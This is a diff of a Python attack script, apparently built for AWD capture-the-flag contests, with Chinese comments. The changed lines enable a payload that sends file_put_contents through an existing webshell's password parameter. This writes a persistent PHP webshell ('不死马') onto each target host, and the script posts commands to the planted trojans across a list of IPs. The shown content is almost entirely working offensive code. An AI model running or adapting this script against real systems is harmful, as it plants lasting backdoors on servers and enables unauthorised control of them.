@@ -32,9 +32,9 @@ payload = {
 
 # 写入不死马
 file = open("E:/tool/AWD/Network-security-tools/Attack/busi.php", "r", encoding="utf-8").read()  # 本地的不死马文件名
-# data = {
-#     passwd: "file_put_contents(\"busi.php\",\"" + file + "\");"  # 写入不死马
-# }
+xieru = {
+    passwd: "file_put_contents(\"busi.php\",\"" + file + "\");"  # 写入不死马
+}
 
 # 读取IP
 # file = open('../Information collection/ip_result_of_scanning.txt', "r")
@@ -56,6 +56,7 @@ def shell():
             url1 = i + path1
             print(url1)
             response1 = requests.post(url1, data=data, headers=headers, timeout=1)  # 链接木马并上传命令
+            # response1 = requests.post(url1, data=data, headers=headers, timeout=1)  # 链接木马并上传命令(此项是用来上传其他文件下的不死马)
             url = i + path
             try:
                 resume()
